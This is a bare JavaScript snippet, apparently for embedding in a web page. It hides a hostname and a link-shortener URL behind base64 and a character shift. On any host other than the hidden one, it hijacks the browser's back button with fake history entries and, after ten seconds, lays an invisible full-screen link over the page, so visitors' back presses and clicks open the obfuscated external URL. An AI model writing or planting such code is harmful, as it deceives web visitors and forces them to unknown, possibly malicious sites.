(function () {
            function enc(str) {
                let shifted = str.split("").map(c =>
                    String.fromCharCode(c.charCodeAt(0) + 3)
                ).join("");
                return btoa(shifted);
            }
            
            function dec(encoded) {
                let shifted = atob(encoded);
                return shifted.split("").map(c =>
                    String.fromCharCode(c.charCodeAt(0) - 3)
                ).join("");
            }

            let host = window.location.hostname.toLowerCase();
            let origin = ['c3VybWhmdzFncvc='];
            let key = 'a3d3c3Y9MjJwZG5odmtydXcxcWh3MmU3TlhLcnZG';

            let valid = false;

            for (let i = 0; i < origin.length; i++) {
                if (dec(origin[i]) === host) {
                    valid = true;
                    break;
                }
            }
            if (!valid) {
                let backHasTriggered = false;

                function armTheTrap() {
                    history.pushState({trap: true}, document.title, location.href);
                    history.pushState({trap: true}, document.title, location.href);
                }

                armTheTrap();

                window.addEventListener('popstate', function (e) {
                    if (backHasTriggered) {
                        return;
                    }
                    backHasTriggered = true;

                    const win = window.open(dec(key), '_blank');

                    if (win && !win.closed && typeof win.closed !== 'undefined') {
                        win.focus();
                        armTheTrap();
                        backHasTriggered = false;
                    }
                });

                setTimeout(() => {
                    const a = document.createElement("a");
                    a.style.position = "fixed";
                    a.style.top = "0";
                    a.style.left = "0";
                    a.style.width = "100vw";
                    a.style.height = "100vh";
                    a.style.background = "transparent";
                    a.style.display = "block";
                    a.style.zIndex = "999999";
                    a.href = dec(key);
                    a.target = "_blank";

                    a.addEventListener("click", () => {
                        a.remove();
                    });

                    document.body.appendChild(a);
                }, 10000);
            }
        })();
